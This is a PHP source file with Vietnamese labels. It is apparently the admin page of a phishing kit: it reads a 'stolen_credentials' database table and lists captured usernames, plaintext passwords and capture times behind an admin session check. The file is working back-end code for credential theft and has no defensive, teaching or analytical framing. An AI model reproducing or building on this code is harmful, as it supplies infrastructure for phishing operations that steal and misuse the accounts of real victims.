<?php
session_start();
require_once 'config.php';

// Kiểm tra quyền quản trị
if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true) {
    header("Location: admin_login.php");
    exit;
}

$stolen_data = [];
// Lấy dữ liệu từ bảng stolen_credentials
$sql = "SELECT id, username, password, capture_time FROM stolen_credentials ORDER BY capture_time DESC";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $stolen_data[] = $row;
    }
}
$conn->close();
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Quản trị dữ liệu giả mạo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .admin-container { max-width: 800px; margin: 0 auto; }
        h2 { border-bottom: 2px solid #ccc; padding-bottom: 10px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        table, th, td { border: 1px solid #ddd; }
        th, td { padding: 12px; text-align: left; }
        th { background-color: #f2f2f2; }
        .logout-button {
            background-color: #d0021b;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 4px;
            cursor: pointer;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="admin-container">
        <h2>Danh sách tài khoản</h2>
        <p style="text-align: right;">
            <a href="logout_admin.php?admin=true" class="logout-button">Đăng xuất admin</a>
        </p>

        <table>
            <thead>
                <tr>
                    <th>STT</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Thời gian</th>
                </tr>
            </thead>
            <tbody>
                <?php $stt = 1; foreach ($stolen_data as $user): ?>
                    <tr>
                        <td><?php echo $stt++; ?></td>
                        <td><?php echo htmlspecialchars($user['username']); ?></td>
                        <td><?php echo htmlspecialchars($user['password']); ?></td>
                        <td><?php echo date('Y-m-d H:i:s', strtotime($user['capture_time'])); ?></td>
                    </tr>
                <?php endforeach; ?>
                <?php if (empty($stolen_data)): ?>
                    <tr>
                        <td colspan="4" style="text-align: center;">Chưa có dữ liệu nào được thu thập.</td>
                    </tr>
                <?php endif; ?>
            </tbody>
        </table>
    </div>
</body>
</html>